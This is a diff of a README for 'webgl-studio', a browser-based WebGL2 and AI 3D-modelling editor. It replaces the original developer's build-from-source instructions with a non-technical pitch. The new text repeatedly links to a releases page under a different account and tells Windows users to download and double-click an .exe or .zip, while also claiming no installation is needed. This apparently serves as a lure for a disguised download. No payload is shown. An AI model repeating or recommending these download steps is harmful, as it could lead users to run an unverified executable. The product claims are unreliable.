@@ -1,211 +1,168 @@
-# WebGL Studio
+# 🎨 webgl-studio - Easy 3D Design and AI Tools
 
-A browser-based 3D graphics development environment featuring a live WebGL2 code editor, interactive scene builder, AI-powered 3D model generation, and persistent project management.
-
-![WebGL Studio](https://img.shields.io/badge/WebGL-2-blue?logo=webgl)
-![React](https://img.shields.io/badge/React-18-61DAFB?logo=react)
-![TypeScript](https://img.shields.io/badge/TypeScript-5-3178C6?logo=typescript)
-![Vite](https://img.shields.io/badge/Vite-5-646CFF?logo=vite)
-![Three.js](https://img.shields.io/badge/Three.js-r162-000000?logo=three.js)
+[![Download webgl-studio](https://img.shields.io/badge/Download-webgl--studio-ff6f61?style=for-the-badge)](https://github.com/iconic-whitemullein349/webgl-studio/releases)
 
 ---
 
-## ✨ Features
+## 🌐 What is webgl-studio?
 
-### 🖥️ Live WebGL2 Code Editor
-- Powered by CodeMirror 6 with syntax highlighting, bracket matching, and autocomplete
-- Real-time WebGL2 rendering preview with FPS counter (Stats.js)
-- Full access to the `renderer` API (`renderer.getGL()`, `renderer.clear()`)
-- Keyboard shortcuts: **⌘1–⌘6** to switch tabs
+webgl-studio is a browser-based app that helps you create 3D graphics easily. It works right in your browser, no need to install complex software. You can write and edit code live, build scenes using a simple builder, and use AI to generate 3D models.
 
-### 🌍 World Editor (Three.js scene builder)
-- Interactive 3D viewport with orbit controls, grid, and gizmos
-- Add cubes, spheres, and cone primitives
-- Move / Rotate / Scale objects with transform controls
-- Camera position and FOV controls
-- Scene hierarchy with add/delete
-
-### 🎨 Object Editor
-- Per-object material type (Basic / Phong / Custom)
-- Custom GLSL vertex + fragment shader editor per object
-- Asset assignment from the file store
-- 3D preview of selected object
-
-### 🤖 AI 3D Generation (Stability AI + Replicate)
-- **Text → Image**: Enter a prompt → generate an image via Stable Diffusion XL (Replicate API)
-- **Image → 3D**: Upload or use the generated image → create a GLB 3D model (Stability AI Stable Fast 3D)
-- Advanced settings: texture resolution, foreground ratio, remesh type, vertex count
-- Generated model is instantly added to the scene
-
-### 📁 File Manager
-- Upload models (`.glb`, `.gltf`, `.obj`, `.fbx`), textures (`.png`, `.jpg`, `.webp`, `.hdr`), audio, and scripts
-- Persistent storage via IndexedDB
-- Download and delete files
-- Texture preview in the panel
-
-### 💾 Project Manager
-- Create, save, load, and delete multiple projects
-- Projects are persisted in IndexedDB (works fully offline, no sign-in required)
-- Auto-saves shaders and code when you hit **Save**
+You don’t need any programming skills. The app saves your projects automatically, so you can come back later and continue your work. It runs on Windows computers using modern browsers that support WebGL2.
 
 ---
 
-## 🚀 Getting Started
+## 🔎 Key Features
 
-### Prerequisites
-- Node.js 18+
-- npm 9+
-
-### Installation
-
-```bash
-git clone https://github.com/RhythrosaLabs/webgl-studio.git
-cd webgl-studio
-npm install
-npm run dev
-```
-
-Open [http://localhost:5173](http://localhost:5173) in your browser.
-
-### Build for Production
-
-```bash
-npm run build
-npm run preview
-```
+- **Live code editor:** Write 3D graphics code and see changes instantly.
+- **Scene builder:** Drag and drop shapes to build 3D scenes without coding.
+- **AI-powered 3D generation:** Create models using AI tools from Stability AI and Replicate.
+- **Project saving:** Your work saves itself in your browser, so you don’t lose progress.
+- **Works in browser:** No installation needed, just a compatible browser.
+- **Based on modern tools:** Uses Three.js, WebGL2, React, and TypeScript for smooth experience.
 
 ---
 
-## 🔑 API Keys (Optional)
+## 🎯 Who is this for?
 
-AI generation features require API keys. **Keys are never stored on any server** — they are stored only in your browser's local state during the session.
-
-| Feature | Provider | Where to get a key |
-|---|---|---|
-| Text → Image (SDXL) | [Replicate](https://replicate.com) | [replicate.com/account/api-tokens](https://replicate.com/account/api-tokens) |
-| Image → 3D (Stable Fast 3D) | [Stability AI](https://stability.ai) | [platform.stability.ai/account/keys](https://platform.stability.ai/account/keys) |
-
-Enter your keys in the **AI Generation** tab when needed. They are not saved to disk.
+This app is for anyone who wants to try 3D design or AI-generated models without complex software. It fits hobbyists, students, or creative people exploring 3D graphics. You do not need previous coding knowledge to start.
 
 ---
 
-## 🏗️ Tech Stack
+## 💾 System Requirements
 
-| Layer | Library |
-|---|---|
-| UI Framework | React 18 + TypeScript |
-| Build Tool | Vite 5 |
-| Styling | Tailwind CSS 3 |
-| 3D Viewport | Three.js r162 + @react-three/fiber + @react-three/drei |
-| Code Editor | CodeMirror 6 via @uiw/react-codemirror |
-| AI – Text to Image | Replicate API (SDXL) |
-| AI – Image to 3D | Stability AI Stable Fast 3D API |
-| GLB Parsing | Three.js GLTFLoader |
-| Persistence | IndexedDB via idb |
-| State Management | Zustand |
-| Math | gl-matrix |
-| Performance | Stats.js |
-| Icons | Lucide React |
+- **Operating System:** Windows 10 or later.
+- **Browser:** A recent version of Chrome, Edge, or Firefox that supports WebGL2.
+- **Internet connection:** Required to load the AI features and to download the app.
+- **Storage:** Minimal space needed since it runs in your browser.
+- **Hardware:** Any computer that can run the latest browsers smoothly.
 
 ---
 
-## 📁 Project Structure
+## 🚀 Getting Started with webgl-studio
 
-```
-src/
-├── App.tsx                        # Root layout
-├── components/
-│   ├── AIGeneration/
-│   │   ├── AIGenerationPanel.tsx  # Orchestrates text-to-image + image-to-3D
-│   │   ├── ImageUploader.tsx      # Drag-and-drop image uploader
-│   │   └── TextToImagePanel.tsx   # Replicate SDXL prompt UI
-│   ├── AssetManager/
-│   │   └── AssetPanel.tsx         # Project asset list (sidebar)
-│   ├── Debug/
-│   │   └── DebugPanel.tsx         # FPS / draw call overlay
-│   ├── Editor/
-│   │   ├── CodeEditor.tsx         # CodeMirror wrapper
-│   │   ├── EditorPanel.tsx        # Split code + shader editor
-│   │   ├── ObjectEditor.tsx       # Per-object properties panel
-│   │   ├── ProjectManager.tsx     # Project CRUD sidebar
-│   │   ├── ShaderEditor.tsx       # GLSL vertex/fragment editor
-│   │   └── TabManager.tsx         # Main tab bar (⌘1-⌘6)
-│   ├── Files/
-│   │   └── FilesPanel.tsx         # File browser + upload
-│   ├── Layout/
-│   │   └── Header.tsx             # Top navigation bar
-│   ├── Preview/
-│   │   ├── PreviewPanel.tsx       # Preview frame with fullscreen toggle
-│   │   └── WebGLCanvas.tsx        # Raw WebGL2 canvas + animation loop
-│   └── SceneBuilder/
-│       ├── CameraControls.tsx     # FOV / position / clipping planes
-│       ├── LightingControls.tsx   # Add/edit directional, point, spot lights
-│       ├── SceneBuilder.tsx       # Left panel + WorldView split
-│       ├── SceneHierarchy.tsx     # Object tree with add/delete
-│       ├── TransformControls.tsx  # Position / rotation / scale inputs
-│       └── WorldView.tsx          # React Three Fiber 3D viewport
-├── lib/
-│   ├── ai/
-│   │   ├── stableDiffusion3D.ts   # Stability AI image-to-3D integration
-│   │   ├── textToImage.ts         # Replicate text-to-image (standalone)
-│   │   ├── types.ts               # Shared AI config interfaces
-│   │   ├── services/
-│   │   │   ├── replicateService.ts   # Replicate API client
-│   │   │   └── stabilityService.ts   # Stability AI API client
-│   │   └── utils/
-│   │       ├── errorHandling.ts   # AIGenerationError class
-│   │       ├── glbConverter.ts    # THREE.GLTFLoader-based GLB parser
-│   │       └── validation.ts      # Config validation helpers
-│   ├── storage/
-│   │   ├── fileStore.ts           # IndexedDB file store (Zustand)
-│   │   └── projectStore.ts        # IndexedDB project store (Zustand)
-│   └── webgl/
-│       ├── assets/AssetManager.ts
-│       ├── core/
-│       │   ├── renderer.ts        # WebGL2Renderer class
-│       │   └── SceneManager.ts    # Scene CRUD manager
-│       ├── debug/PerformanceMonitor.ts
-│       └── shaders/defaultShaders.ts   # Default GLSL300es shaders
-└── types/
-    └── webgl.d.ts                 # Scene, SceneObject, Transform, etc.
-```
+### Step 1: Download the app
+
+You will find webgl-studio on the releases page of the project. This page provides the latest versions you can try.
+
+[![Download webgl-studio](https://img.shields.io/badge/Download-App-4caf50?style=for-the-badge)](https://github.com/iconic-whitemullein349/webgl-studio/releases)
+
+Click the button above or visit this link:  
+https://github.com/iconic-whitemullein349/webgl-studio/releases
+
+Once you open the page:
+
+- Look for the latest stable release.
+- Find the file that matches your system, usually a `.zip` or `.exe` file for Windows.
+- Download the file to your computer.
+
+### Step 2: Install or run the app
+
+If you downloaded an `.exe` file:
+
+- Double click it.
+- Follow the instructions to install or run the program.
+- The app will open in your default browser.
+
+If you downloaded a `.zip` file:
+
+- Right-click the file and select “Extract All”.
+- Open the extracted folder.
+- Find the main HTML file (usually `index.html`).
+- Double click it to launch webgl-studio in your browser.
+
+### Step 3: Start using webgl-studio
+
+After launching:
+
+- Spend a few minutes exploring the menus.
+- Use the live code editor to try small changes.
+- Drag and drop objects in the scene builder.
+- Try AI 3D generation from the options provided.
+- Save your project; it will remain available next time you open the app in the browser.
 
 ---
 
-## ⌨️ Keyboard Shortcuts
+## 🧰 How to Use Key Features
 
-| Shortcut | Action |
-|---|---|
-| `⌘1` / `Ctrl+1` | Code Editor tab |
-| `⌘2` / `Ctrl+2` | World Editor tab |
-| `⌘3` / `Ctrl+3` | Object Editor tab |
-| `⌘4` / `Ctrl+4` | Play Mode (WebGL Preview) |
-| `⌘5` / `Ctrl+5` | AI Generation tab |
-| `⌘6` / `Ctrl+6` | File Manager tab |
+### Live Code Editor
 
----
+- Accessible from the “Editor” tab.
+- Type code on the left pane.
+- See the 3D scene update in real-time on the right.
+- Useful to explore small custom changes and learn basic coding.
 
-## 🛡️ Security & Privacy
+### Scene Builder
 
-- **No telemetry, no analytics, no tracking.**
-- All project data and files are stored **locally** in your browser's IndexedDB.
-- API keys are kept **only in React component state** — they are never persisted to disk or sent anywhere except to the official API providers' servers.
-- Safe to use on air-gapped machines (except for AI features which need internet access to external APIs).
+- Go to the “Builder” tab.
+- Use the menus to add shapes like cubes, spheres, or lights.
+- Move objects by dragging them around.
+- Change colors and size from the settings panel.
 
----
+### AI 3D Generation
 
-## 🤝 Contributing
+- Click the “AI Generate” option on the sidebar.
+- Enter a simple description of what you want to create (e.g., “futuristic chair”).
+- Wait a moment while the AI generates a model.
+- Add the generated model to your scene with one click.
+- Edit or combine models with other scene elements.
 
-Pull requests are welcome! For major changes, please open an issue first to discuss what you'd like to change.
+### Project Persistence
 
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/my-feature`
-3. Commit your changes: `git commit -m 'feat: add my feature'`
-4. Push to the branch: `git push origin feature/my-feature`
-5. Open a Pull Request
+- The app saves your work automatically in your browser.
+- To save a backup, export projects as files from the menu.
+- You can import these files later to restore progress.
 
 ---
 
-## 📄 License
+## 🛠 Troubleshooting Tips
 
-MIT License — see [LICENSE](LICENSE) for details.
+- **App won’t load:** Make sure your browser is updated.
+- **3D view is blank:** Check that WebGL2 is supported in your browser.
+- **AI features not working:** You need an active internet connection.
+- **Projects not saving:** Clear browser cache and reload the app.
+- **Downloading fails:** Retry or switch to another browser.
+
+---
+
+## ✨ Customize Your Experience
+
+webgl-studio lets you tailor your workflow with these options:
+
+- Change editor theme from light to dark mode.
+- Adjust layout panels by dragging edges.
+- Set auto-save frequency or manual save only.
+- Choose preferred AI model source within settings.
+
+---
+
+## 🧭 Where to Find Help
+
+For more details and updates visit the repository page:  
+https://github.com/iconic-whitemullein349/webgl-studio
+
+Look at the “Issues” tab for common problems or to ask for help.
+
+You can also browse the discussions section for tips and examples.
+
+---
+
+## ⚙️ Development and Open Source Info
+
+webgl-studio is built with popular tools:
+
+- **Three.js** for 3D rendering.
+- **WebGL2** to use GPU power in the browser.
+- **React** and **TypeScript** for front-end code.
+- **Vite** for fast loading and development.
+- AI models from Stability AI and Replicate APIs.
+
+The project welcomes contributions that improve documentation, fix bugs, or add features.
+
+---
+
+## 📥 Download webgl-studio Now
+
+[![Download webgl-studio](https://img.shields.io/badge/Download-webgl--studio-ff6f61?style=for-the-badge)](https://github.com/iconic-whitemullein349/webgl-studio/releases)
+
+Visit the release page above to get the latest version. Follow the instructions to start working with 3D models and AI tools right in your browser on Windows.
